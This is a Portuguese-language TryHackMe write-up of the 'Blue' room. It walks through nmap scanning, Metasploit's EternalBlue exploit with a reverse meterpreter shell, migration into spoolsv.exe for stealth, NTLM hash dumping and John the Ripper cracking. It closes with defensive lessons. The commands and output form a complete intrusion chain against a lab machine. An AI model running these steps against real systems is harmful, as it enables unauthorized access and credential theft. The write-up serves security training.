[blue-writeup.md](https://github.com/user-attachments/files/26435415/blue-writeup.md)
# 🔵 Blue — TryHackMe Writeup

**Plataforma:** TryHackMe  
**Room:** [Blue](https://tryhackme.com/room/blue)  
**Dificuldade:** Fácil  
**Sistema Alvo:** Windows 7 Professional SP1 x64  
**Hostname:** JON-PC  
**Status:** ✅ Concluída 100%  
**Data:** Abril 2026  
**Autor:** [Mateus Camara Dias](https://github.com/mateusdias96cs)

---

## 📋 Índice

1. [Sobre a Room](#sobre-a-room)
2. [Ferramentas Utilizadas](#ferramentas-utilizadas)
3. [Fase 1 — Reconhecimento](#fase-1--reconhecimento)
4. [Fase 2 — Identificação da Vulnerabilidade](#fase-2--identificação-da-vulnerabilidade)
5. [Fase 3 — Exploração](#fase-3--exploração)
6. [Fase 4 — Pós-Exploração e Persistência](#fase-4--pós-exploração-e-persistência)
7. [Fase 5 — Extração de Credenciais](#fase-5--extração-de-credenciais)
8. [Fase 6 — Cracking do Hash](#fase-6--cracking-do-hash)
9. [Fase 7 — Captura das Flags](#fase-7--captura-das-flags)
10. [Conclusão](#conclusão)
11. [Lições Aprendidas](#lições-aprendidas)

---

## Sobre a Room

A room **Blue** é uma das mais icônicas do TryHackMe para iniciantes em segurança ofensiva. Ela simula um ambiente Windows 7 vulnerável à exploração via **EternalBlue (MS17-010)** — a mesma vulnerabilidade utilizada pelo ransomware **WannaCry** em 2017, que infectou mais de 200.000 máquinas em 150 países em questão de horas.

O objetivo é realizar o ciclo completo de um pentest: reconhecimento, identificação de vulnerabilidade, exploração, pós-exploração, extração de credenciais e captura de flags.

> *"Deploy & hack into a Windows machine, leveraging common misconfiguration issues."* — TryHackMe

---

## Ferramentas Utilizadas

| Ferramenta | Finalidade |
|---|---|
| `nmap` | Reconhecimento e detecção de vulnerabilidades |
| `metasploit (msfconsole)` | Exploração via EternalBlue |
| `meterpreter` | Pós-exploração e controle da máquina |
| `john (John the Ripper)` | Cracking de hash NTLM |
| `rockyou.txt` | Wordlist para ataque de dicionário |

---

## Fase 1 — Reconhecimento

O primeiro passo em qualquer pentest é o reconhecimento — entender o alvo antes de atacá-lo. Para isso, utilizei o `nmap` com detecção de versão de serviços e scripts de vulnerabilidade:

```bash
nmap -sV -sC --script vuln -oN blue.nmap 10.65.173.162
```

**Flags utilizadas:**
- `-sV` — detecta versões dos serviços em execução
- `-sC` — executa scripts padrão do nmap
- `--script vuln` — executa scripts específicos de detecção de vulnerabilidades
- `-oN blue.nmap` — salva o output em arquivo para referência futura

**Portas abertas encontradas:**

| Porta | Estado | Serviço | Versão |
|---|---|---|---|
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| **445/tcp** | **open** | **microsoft-ds** | **Windows 7–10 microsoft-ds** |
| 3389/tcp | open | tcpwrapped | — |
| 49152–49165/tcp | open | msrpc | Microsoft Windows RPC |

**Informações do sistema identificadas:**
- **Hostname:** JON-PC
- **Sistema Operacional:** Windows 7 Professional 7601 Service Pack 1 x64
- **Workgroup:** WORKGROUP

A porta **445 (SMB)** imediatamente chamou atenção — é a porta do protocolo SMB, historicamente alvo de explorações críticas.

---

## Fase 2 — Identificação da Vulnerabilidade

O resultado mais relevante do scan foi a confirmação da vulnerabilidade **MS17-010** na porta 445:

```
smb-vuln-ms17-010:
  VULNERABLE:
  Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    State: VULNERABLE
    IDs: CVE:CVE-2017-0143
    Risk factor: HIGH
    Disclosure date: 2017-03-14
```

**O que é o EternalBlue (MS17-010)?**

O EternalBlue é uma vulnerabilidade crítica no protocolo **SMBv1** do Windows, originalmente descoberta pela NSA e vazada pelo grupo Shadow Brokers em março de 2017. Ela permite que um atacante execute código remotamente em sistemas Windows **sem necessidade de autenticação**, explorando um buffer overflow no serviço SMB.

- **CVE:** CVE-2017-0143
- **Risk Factor:** HIGH
- **Impacto:** Remote Code Execution (RCE)
- **Famosa por:** WannaCry (2017), NotPetya (2017)

---

## Fase 3 — Exploração

Com a vulnerabilidade confirmada, carreguei o **Metasploit Framework** e busquei o módulo adequado:

```bash
msfconsole
msf6 > search ms17
```

O comando listou todos os módulos relacionados ao MS17-010. O módulo escolhido foi o **EternalBlue**:

```
exploit/windows/smb/ms17_010_eternalblue
```

```bash
msf6 > use 0
```

Ao selecionar o módulo, o Metasploit configurou automaticamente o payload padrão:

```
windows/x64/meterpreter/reverse_tcp
```

Este payload estabelece uma **conexão reversa** — a máquina alvo se conecta de volta à máquina atacante, facilitando a passagem por firewalls.

**Verificação das opções com `show options`:**

| Opção | Valor | Status |
|---|---|---|
| RHOSTS | — | ⚠️ Necessário configurar |
| RPORT | 445 | ✅ Configurado |
| LHOST | 10.65.124.138 | ✅ Configurado |
| LPORT | 4444 | ✅ Configurado |

Configurei o IP do alvo e executei o exploit:

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.65.173.162
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

**Output do exploit:**

```
[+] 10.65.173.162:445 - Host is likely VULNERABLE to MS17-010!
[+] 10.65.173.162:445 - Windows 7 Professional 7601 SP1 x64 (64-bit)
[+] 10.65.173.162:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[+] Meterpreter session 1 opened (10.65.124.138:4444 → 10.65.173.162:49286)
```

**Acesso obtido com sucesso.** Uma sessão Meterpreter foi aberta na máquina alvo.

---

## Fase 4 — Pós-Exploração e Persistência

### Verificando o nível de acesso

Verifiquei as sessões ativas para confirmar o nível de privilégio obtido:

```bash
msf6 > sessions
```

```
Id  Type                     Information                   Connection
1   meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.65.124.138:4444 → 10.65.173.162:49286
```

**`NT AUTHORITY\SYSTEM`** — o nível máximo de privilégio no Windows. O EternalBlue entregou controle total da máquina diretamente, sem necessidade de escalação de privilégios separada.

### Listando processos

Para manter acesso furtivo e estável, listei os processos em execução na máquina alvo:

```bash
meterpreter > ps
```

Entre os processos identificados, destaque para:

| PID | Nome | Usuário | Caminho |
|---|---|---|---|
| 720 | lsass.exe | NT AUTHORITY\SYSTEM | C:\Windows\system32\lsass.exe |
| **712** | **spoolsv.exe** | **NT AUTHORITY\SYSTEM** | **C:\Windows\System32\spoolsv.exe** |
| 1312 | cmd.exe | NT AUTHORITY\SYSTEM | C:\Windows\system32\cmd.exe |
| 3024 | powershell.exe | NT AUTHORITY\SYSTEM | C:\Windows\PowerShell\v1.0\powershell.exe |

### Migração de processo

Migrei a sessão para o processo `spoolsv.exe` (PID 712):

```bash
meterpreter > migrate 712
[*] Migrating from 1312 to 712...
[*] Migration completed successfully.
```

**Por que o `spoolsv.exe`?**

O `spoolsv.exe` é o serviço de gerenciamento de impressão e fax do Windows — um processo legítimo do sistema que raramente é encerrado por administradores. Migrar para ele garante dois objetivos:

- **Persistência:** o processo dificilmente será encerrado manualmente
- **Furtividade:** um analista que inspecionasse os processos veria apenas um serviço de impressão funcionando normalmente, sem levantar suspeitas

---

## Fase 5 — Extração de Credenciais

Com a sessão estável, executei o `hashdump` para extrair os hashes NTLM de todos os usuários da máquina:

```bash
meterpreter > hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

**Análise dos hashes:**

| Usuário | RID | Hash NTLM | Observação |
|---|---|---|---|
| Administrator | 500 | 31d6cfe0d16ae931b73c59d7e0c089c0 | Hash vazio — sem senha configurada |
| Guest | 501 | 31d6cfe0d16ae931b73c59d7e0c089c0 | Hash vazio — conta de convidado |
| **Jon** | **1000** | **ffb43f0de35be4d9917ac0cc8ad57f8d** | **Hash único — senha real** |

O hash de interesse é o do usuário **Jon** — o único com senha real configurada. Este hash foi salvo em arquivo para cracking offline:

```bash
nano jonpc.hash
# Conteúdo salvo:
# Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

---

## Fase 6 — Cracking do Hash

Com o hash salvo, utilizei o **John the Ripper** com a wordlist `rockyou.txt` para realizar um ataque de dicionário:

```bash
/usr/sbin/john --format=NT jonpc.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado:**

```
alqfna22         (Jon)
1g 0:00:00:07 DONE
Session completed.
```

**Senha do usuário Jon: `alqfna22`**

O hash foi quebrado em apenas **7 segundos** — demonstrando que senhas fracas presentes em wordlists públicas como a `rockyou.txt` são extremamente vulneráveis a ataques de dicionário.

---

## Fase 7 — Captura das Flags

Com acesso total à máquina, naveguei pelo sistema em busca das 3 flags.

### 🚩 Flag 1 — Raiz do sistema

```bash
meterpreter > pwd
C:\Windows\system32

meterpreter > cd ..
meterpreter > cd ..
meterpreter > ls
```

A **flag1.txt** estava na raiz `C:\` — acessível apenas com privilégio SYSTEM.

```
flag1.txt  —  C:\flag1.txt
```

### 🚩 Flag 2 — Diretório de configuração do sistema

```bash
meterpreter > cd C:\Windows\System32\config
meterpreter > ls
```

A **flag2.txt** estava em `C:\Windows\System32\config` — o diretório mais sensível do Windows, onde ficam armazenados os arquivos de registro do sistema (`SAM`, `SYSTEM`, `SECURITY`).

```
flag2.txt  —  C:\Windows\System32\config\flag2.txt
```

### 🚩 Flag 3 — Documentos do usuário Jon

```bash
meterpreter > cd C:\Users\Jon\Documents
meterpreter > ls
```

A **flag3.txt** estava na pasta de documentos pessoais do usuário Jon — fechando o ciclo completo do ataque com acesso aos arquivos privados do usuário.

```
flag3.txt  —  C:\Users\Jon\Documents\flag3.txt
```

---

## Conclusão

| Fase | Técnica | Resultado |
|---|---|---|
| Reconhecimento | `nmap -sV -sC --script vuln` | Porta 445 aberta, MS17-010 identificado |
| Vulnerabilidade | EternalBlue — CVE-2017-0143 | Risk factor: HIGH, RCE confirmado |
| Exploração | `exploit/windows/smb/ms17_010_eternalblue` | Sessão Meterpreter aberta |
| Privilégio | — | NT AUTHORITY\SYSTEM (direto) |
| Persistência | `migrate` → `spoolsv.exe` (PID 712) | Sessão estável e furtiva |
| Extração | `hashdump` | 3 hashes NTLM extraídos |
| Cracking | John the Ripper + rockyou.txt | Senha `alqfna22` em 7 segundos |
| Flags | Navegação pelo sistema | 🚩 3/3 flags capturadas |

A máquina **JON-PC** foi completamente comprometida explorando uma vulnerabilidade pública conhecida desde 2017 no protocolo SMBv1. A cadeia de ataque completa — do reconhecimento até a captura das 3 flags — foi executada com sucesso, demonstrando o impacto real de sistemas Windows desatualizados expostos em rede.

---

## Lições Aprendidas

### Para atacantes (Red Team)
- O EternalBlue continua sendo uma das vulnerabilidades mais poderosas para ambientes Windows desatualizados
- Migrar para processos legítimos do sistema é essencial para manter furtividade e persistência
- Hashes NTLM extraídos via `hashdump` podem ser quebrados rapidamente com wordlists públicas quando as senhas são fracas
- O Meterpreter oferece um arsenal completo de ferramentas de pós-exploração sem necessidade de ferramentas externas

### Para defensores (Blue Team)
- ✅ Aplicar o patch **MS17-010** imediatamente em todos os sistemas Windows — disponível desde março de 2017
- ✅ Desabilitar o **SMBv1** — protocolo obsoleto e desnecessário na maioria dos ambientes modernos
- ✅ Implementar política de senhas fortes — `alqfna22` foi quebrado em apenas 7 segundos
- ✅ Monitorar migrações de processo suspeitas e conexões reversas na rede
- ✅ Segmentar a rede para limitar propagação lateral via SMB
- ✅ Implementar EDR (Endpoint Detection and Response) para detectar comportamentos anômalos como o `hashdump`

---

> *Writeup produzido para fins educacionais. Todas as atividades foram realizadas em ambiente controlado e autorizado pela plataforma TryHackMe.*

**Autor:** Mateus Camara Dias
[![GitHub](https://img.shields.io/badge/GitHub-mateusdias96cs-0d1117?style=flat&logo=github)](https://github.com/mateusdias96cs)
[![TryHackMe](https://img.shields.io/badge/TryHackMe-mateus96cs-212C42?style=flat&logo=tryhackme&logoColor=red)](https://tryhackme.com/p/mateus96cs)
